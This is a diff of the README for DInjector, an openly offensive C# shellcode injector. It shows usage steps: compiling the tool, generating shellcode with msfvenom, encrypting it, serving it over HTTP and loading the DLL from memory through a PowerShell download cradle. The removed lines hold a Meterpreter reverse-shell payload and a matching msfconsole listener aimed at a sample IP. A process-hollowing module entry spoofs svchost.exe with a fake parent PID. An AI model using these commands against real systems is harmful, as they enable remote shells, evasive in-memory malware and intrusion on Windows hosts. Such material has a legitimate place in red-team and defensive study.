@@ -35,10 +35,10 @@ Features:
 ## Usage
 
 1. Compile the project in VS (or via [OffensivePipeline](https://github.com/snovvcrash/OffensivePipeline/releases/tag/v0.8.2)).
-2. Generate a shellcode for your favourite C2:
+2. Generate a shellcode of your choice:
 
 ```console
-~$ msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f raw -o shellcode.bin
+~$ msfvenom -p windows/x64/messagebox TITLE="MSF" TEXT="Hello from DInjector" EXITFUNC=thread -f raw -o shellcode.bin
 ```
 
 3. [Encrypt](encrypt.py) the shellcode:
@@ -47,11 +47,12 @@ Features:
 ~$ encrypt.py shellcode.bin -p 'Passw0rd!' -o enc
 ```
 
-4. Serve the encrypted shellcode and prepare C2 listener:
+4. Serve the encrypted shellcode:
 
 ```console
+~$ file enc
+enc: data
 ~$ sudo python3 -m http.server 80
-~$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost 10.10.13.37; set lport 443; set EXITFUNC thread; run"
 ```
 
 5. Use the PowerShell download [cradle](/cradle.ps1) to load DInjector.dll as `System.Reflection.Assembly` and execute it from memory.
@@ -346,10 +347,10 @@ references:
   - 'https://github.com/djhohnstein/CSharpSetThreadContext/blob/master/Runner/Program.cs'
 ```
 
-### [ProcessHollow](/DInjector/Modules/ProcessHollow.cs)
+### [ProcessHollowing](/DInjector/Modules/ProcessHollowing.cs)
 
 ```yaml
-module_name: 'processhollow'
+module_name: 'processhollowing'
 arguments: |
   /image:C:\Windows\System32\svchost.exe
   /ppid:31337
